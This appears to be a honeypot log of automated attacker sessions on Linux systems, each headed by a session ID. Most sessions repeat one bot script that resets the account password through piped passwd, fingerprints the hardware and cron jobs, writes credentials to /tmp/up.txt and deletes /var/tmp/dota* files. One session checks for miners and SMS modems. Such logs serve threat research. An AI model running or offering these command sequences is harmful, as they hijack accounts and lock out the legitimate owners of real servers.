+echo "welcome\nyMX5gBZATH3O\nyMX5gBZATH3O\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin welcome" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: b02ba3fa9b34
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "7ujMko0admin\nDeBD9cmsgyq2\nDeBD9cmsgyq2"|passwd|bash
+echo "7ujMko0admin\nDeBD9cmsgyq2\nDeBD9cmsgyq2\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 7ujMko0admin" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: e62f991e93c1
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "access\nq1yUYgrUbSek\nq1yUYgrUbSek"|passwd|bash
+echo "access\nq1yUYgrUbSek\nq1yUYgrUbSek\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin access" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 9e3647d40543
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "nospam\ndTETElvFqA99\ndTETElvFqA99"|passwd|bash
+echo "nospam\ndTETElvFqA99\ndTETElvFqA99\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin nospam" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: e3fd87a5d8ae
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "12345\nd2B8FB9fYkJd\nd2B8FB9fYkJd"|passwd|bash
+echo "12345\nd2B8FB9fYkJd\nd2B8FB9fYkJd\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 12345" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 526d0ecb7325
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qmfltmqjs!@#$\nq9CcO6SZqaUQ\nq9CcO6SZqaUQ"|passwd|bash
+echo "qmfltmqjs!@#$\nq9CcO6SZqaUQ\nq9CcO6SZqaUQ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qmfltmqjs!@#$" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 2542d1a806d7
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@ssw0rd!\n04y9jgtiLFhd\n04y9jgtiLFhd"|passwd|bash
+echo "P@ssw0rd!\n04y9jgtiLFhd\n04y9jgtiLFhd\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@ssw0rd!" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: cba25cd20858
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "password\nY5N4azcD5bjg\nY5N4azcD5bjg"|passwd|bash
+echo "password\nY5N4azcD5bjg\nY5N4azcD5bjg\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin password" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 46078a827d4c
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "7ujMko0admin\nJdtNgtQeY1aW\nJdtNgtQeY1aW"|passwd|bash
+echo "7ujMko0admin\nJdtNgtQeY1aW\nJdtNgtQeY1aW\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 7ujMko0admin" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 20770ac699c2
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "Password\nPDbsyVnkm4uH\nPDbsyVnkm4uH"|passwd|bash
+echo "Password\nPDbsyVnkm4uH\nPDbsyVnkm4uH\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin Password" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 4a59a6edd4f5
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "abc123\nGiKup5UhX169\nGiKup5UhX169"|passwd|bash
+echo "abc123\nGiKup5UhX169\nGiKup5UhX169\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin abc123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 850e8849a408
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "4dm1n\nysHQdtmaD7w3\nysHQdtmaD7w3"|passwd|bash
+echo "4dm1n\nysHQdtmaD7w3\nysHQdtmaD7w3\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 4dm1n" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: a08fd95e13ce
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123qwe\nMSxQeIJlwF1e\nMSxQeIJlwF1e"|passwd|bash
+echo "123qwe\nMSxQeIJlwF1e\nMSxQeIJlwF1e\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123qwe" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 6026e591b06c
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "meinsm\n2MMElGVg4CIw\n2MMElGVg4CIw"|passwd|bash
+echo "meinsm\n2MMElGVg4CIw\n2MMElGVg4CIw\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin meinsm" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 01224e56a54d
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "changeme\ntghst81XV7v9\ntghst81XV7v9"|passwd|bash
+echo "changeme\ntghst81XV7v9\ntghst81XV7v9\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin changeme" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: e319a961c2ef
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin2019\nCO8OVFjYUznp\nCO8OVFjYUznp"|passwd|bash
+echo "admin2019\nCO8OVFjYUznp\nCO8OVFjYUznp\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin2019" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 9b1a19a2b27a
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin@123\niyop7KFuu6WM\niyop7KFuu6WM"|passwd|bash
+echo "admin@123\niyop7KFuu6WM\niyop7KFuu6WM\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin@123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 0f712a9e059d
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123admin123\nWVry1SVUVvPl\nWVry1SVUVvPl"|passwd|bash
+echo "123admin123\nWVry1SVUVvPl\nWVry1SVUVvPl\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123admin123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 82ee34a511e9
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "changeme\nv3BDodRdNLVY\nv3BDodRdNLVY"|passwd|bash
+echo "changeme\nv3BDodRdNLVY\nv3BDodRdNLVY\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin changeme" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 485d7c50b668
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "access\nAEYv1pKBLIDK\nAEYv1pKBLIDK"|passwd|bash
+echo "access\nAEYv1pKBLIDK\nAEYv1pKBLIDK\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin access" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 5835e717134a
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "321\nHvUg9doCroiY\nHvUg9doCroiY"|passwd|bash
+echo "321\nHvUg9doCroiY\nHvUg9doCroiY\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 321" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 1b3e54707de4
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "pass123\n6LfpNUR5vNzT\n6LfpNUR5vNzT"|passwd|bash
+echo "pass123\n6LfpNUR5vNzT\n6LfpNUR5vNzT\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin pass123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 15bab7fa75a3
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin1234\nI9iRPHvQV97A\nI9iRPHvQV97A"|passwd|bash
+echo "admin1234\nI9iRPHvQV97A\nI9iRPHvQV97A\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 61fd96f6e524
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin1234\nTYdxmy7BaA1L\nTYdxmy7BaA1L"|passwd|bash
+echo "admin1234\nTYdxmy7BaA1L\nTYdxmy7BaA1L\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d5fa9027c4d6
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123123\nAC2hFqDCilWS\nAC2hFqDCilWS"|passwd|bash
+echo "123123\nAC2hFqDCilWS\nAC2hFqDCilWS\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 79619b7f9c66
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "000000\nIYqUYq20Ts8G\nIYqUYq20Ts8G"|passwd|bash
+echo "000000\nIYqUYq20Ts8G\nIYqUYq20Ts8G\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 000000" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 4e38c70504a2
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwe123\nelYfgfjZl8wO\nelYfgfjZl8wO"|passwd|bash
+echo "qwe123\nelYfgfjZl8wO\nelYfgfjZl8wO\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwe123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 7c2cbad41c96
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "Admin@123\n1Bw8FQL2UhUQ\n1Bw8FQL2UhUQ"|passwd|bash
+echo "Admin@123\n1Bw8FQL2UhUQ\n1Bw8FQL2UhUQ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin Admin@123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d324cf6e4da1
+/ip cloud print
+ifconfig
+uname -a
+cat /proc/cpuinfo
+ps | grep '[Mm]iner'
+ps -ef | grep '[Mm]iner'
+ls -la /dev/ttyGSM* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+echo Hi | cat -n
+
+Session ID: 56e2dfa7d5eb
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwe123\nwLbFiDfs8B1f\nwLbFiDfs8B1f"|passwd|bash
+echo "qwe123\nwLbFiDfs8B1f\nwLbFiDfs8B1f\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwe123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 10867000efe0
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "Password\na5dgVpskfnjZ\na5dgVpskfnjZ"|passwd|bash
+echo "Password\na5dgVpskfnjZ\na5dgVpskfnjZ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin Password" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 5b8f1d601285
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123456789\nbeq1gbifjUUD\nbeq1gbifjUUD"|passwd|bash
+echo "123456789\nbeq1gbifjUUD\nbeq1gbifjUUD\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123456789" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: f13cbe58bace
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "adminadmin\nDb3GEib531vm\nDb3GEib531vm"|passwd|bash
+echo "adminadmin\nDb3GEib531vm\nDb3GEib531vm\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin adminadmin" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 1090775c666e
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "Password\na5dgVpskfnjZ\na5dgVpskfnjZ"|passwd|bash
+echo "Password\na5dgVpskfnjZ\na5dgVpskfnjZ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin Password" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 8f6c243e7606
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin2020\n6TKGz02YAUY7\n6TKGz02YAUY7"|passwd|bash
+echo "admin2020\n6TKGz02YAUY7\n6TKGz02YAUY7\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin2020" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: a341616d8230
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "Password\na5dgVpskfnjZ\na5dgVpskfnjZ"|passwd|bash
+echo "Password\na5dgVpskfnjZ\na5dgVpskfnjZ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin Password" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 18a5c1818292
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "q1w2e3\nHZTLz4tmzi0p\nHZTLz4tmzi0p"|passwd|bash
+echo "q1w2e3\nHZTLz4tmzi0p\nHZTLz4tmzi0p\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin q1w2e3" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 3d943d27ec4b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "access\nMD9f4jvpdKCa\nMD9f4jvpdKCa"|passwd|bash
+echo "access\nMD9f4jvpdKCa\nMD9f4jvpdKCa\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin access" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: ae4d5398f9e2
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "pass@123\nVHuttsL0AfnI\nVHuttsL0AfnI"|passwd|bash
